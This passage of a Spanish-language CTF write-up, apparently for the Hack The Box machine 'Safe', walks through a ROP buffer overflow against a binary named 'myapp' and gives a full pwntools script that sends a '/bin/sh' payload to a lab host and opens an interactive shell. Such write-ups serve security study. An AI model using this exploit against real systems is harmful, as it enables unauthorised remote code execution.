<p>Entonces, la variable <code class="language-plaintext highlighter-rouge">local_78</code> ciertamente tiene una longitud m√°xima de <em>112 bytes</em>, sin embargo, necesitamos de <em>8 bytes</em> m√°s, para desbordar satisfactoriamente el <code class="language-plaintext highlighter-rouge">buffer</code>, de este modo, los bytes siguientes a 112 se estar√≠an almacenando en el registro <code class="language-plaintext highlighter-rouge">RSP</code>, pero hasta que no introduzcamos como m√≠nimo <em>120 bytes</em>, no vamos a conseguir un <code class="language-plaintext highlighter-rouge">Segmentation Fault</code>, raz√≥n por la cual, si al binario <code class="language-plaintext highlighter-rouge">myapp</code>, le pasamos una cadena ya sea de 113, 114, 115, 116 117, 118 o 119 bytes, conseguiremos una salida exitosa.</p>

<p>Lo que nos interesa ahora, es sobrescribir el registro <code class="language-plaintext highlighter-rouge">RSP</code> con nuestro c√≥digo malicioso, de modo que este pase al registro <code class="language-plaintext highlighter-rouge">RSI</code>, de modo que cuando se ejecute la funci√≥n <code class="language-plaintext highlighter-rouge">jump</code> hacia la direcci√≥n de la llamada al sistema, nos ejecute nuestro c√≥digo.</p>

<p>Concretamente vamos a ejecutar el comando <code class="language-plaintext highlighter-rouge">/bin/sh</code> en adici√≥n de un <code class="language-plaintext highlighter-rouge">null byte</code> por si nos da problemas, la longitud total de esta cadena es de <em>8 bytes</em>, (7 en <code class="language-plaintext highlighter-rouge">/bin/sh</code>, m√°s el del <code class="language-plaintext highlighter-rouge">null byte</code>) por lo que estar√≠amos desbordando el <code class="language-plaintext highlighter-rouge">buffer</code>, e ingresando esta cadena en el registro <code class="language-plaintext highlighter-rouge">RSP</code>.</p>

<p>La siguiente variable por definir ser√° <code class="language-plaintext highlighter-rouge">binSh</code>, la cual, como mencionamos, valdr√° el comando <code class="language-plaintext highlighter-rouge">/bin/sh</code> en adici√≥n de un <code class="language-plaintext highlighter-rouge">null byte</code>, y al igual que la variable <code class="language-plaintext highlighter-rouge">junk</code>, deberemos codificarla; la √∫ltima variable que definiremos ser√°, <code class="language-plaintext highlighter-rouge">nullByte</code>, la cual usaremos para asignar valores nulos a las direcciones <code class="language-plaintext highlighter-rouge">R14</code> y <code class="language-plaintext highlighter-rouge">R15</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">binSH</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
<span class="n">nullByte</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
</code></pre></div></div>

<p>Ya para finalizar, debemos indicar la cadena de caracteres que queremos enviar, despu√©s de que se nos pregunte <em>What do you want me to echo back?</em>, para hacer esto tendremos que hacer uso de <code class="language-plaintext highlighter-rouge">p.sendline()</code>, dentro del cual indicaremos las variables que acabamos de definir, en su respectivo orden.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">junk</span> <span class="o">+</span> <span class="n">binSH</span> <span class="o">+</span> <span class="n">popR13</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="n">null</span> <span class="o">+</span> <span class="n">null</span> <span class="o">+</span> <span class="n">test</span><span class="p">)</span>
</code></pre></div></div>

<p>En primer lugar estamos introduciendo una cadena de <em>112 bytes</em>, posteriormente introducimos nuestro c√≥digo malicioso que suma una longitud de <em>8 bytes</em>, de modo que estar√≠amos ya, sobrescribiendo el registro <code class="language-plaintext highlighter-rouge">RSP</code>, que se convertir√° en <code class="language-plaintext highlighter-rouge">RSI</code>, posteriormente, haremos una llamada al <code class="language-plaintext highlighter-rouge">gadget pop</code>, al cual le pasaremos como argumentos lo que nos solicita, la direcci√≥n de <code class="language-plaintext highlighter-rouge">R13</code>, <code class="language-plaintext highlighter-rouge">R14</code>, <code class="language-plaintext highlighter-rouge">R15</code> y <code class="language-plaintext highlighter-rouge">RET</code>, los cuales valdr√°n la direcci√≥n de la llamada al sistema, valor nulo, valor nulo y como funci√≥n de regreso, la direcci√≥n de la funci√≥n <code class="language-plaintext highlighter-rouge">test</code>, redirigiendo as√≠, el flujo del programa a trav√©s de esa funci√≥n.</p>

<p>Ya lo que nos quedar√≠a, ser√≠a ejecutar nuestro script, no de manera local, pero remota, para lo cual debemos introducir la direcci√≥n IP de la m√°quina v√≠ctima, e indicar el puerto a trav√©s del cual nos queremos conectar.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.10.147"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
</code></pre></div></div>

<p>As√≠ mismo, es necesario especificar que queremos interactuar con la consola que estamos consiguiendo, para lo cual deberemos indicar lo siguiente:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Nuestro script, deber√≠a verse algo as√≠:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'gnome-terminal'</span><span class="p">,</span> <span class="s">'-x'</span><span class="p">]</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>

<span class="c1"># p = gdb.debug('/home/m4teo/Documents/hackTheBox/machines/Safe/content/myapp', 'b *0x40116e')
# p.recvuntil("What do you want me to echo back?")
</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.10.147"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>

<span class="n">popR13</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401206</span><span class="p">)</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40116e</span><span class="p">)</span>
<span class="n">test</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401152</span><span class="p">)</span>
 
<span class="n">junk</span> <span class="o">=</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">112</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>
  
<span class="n">binSh</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
  
<span class="n">nullByte</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
  
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">junk</span> <span class="o">+</span> <span class="n">binSh</span> <span class="o">+</span> <span class="n">popR13</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="n">nullByte</span> <span class="o">+</span> <span class="n">nullByte</span> <span class="o">+</span> <span class="n">test</span><span class="p">)</span>
  
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>

<p>En un futuro‚Ä¶</p>
:ET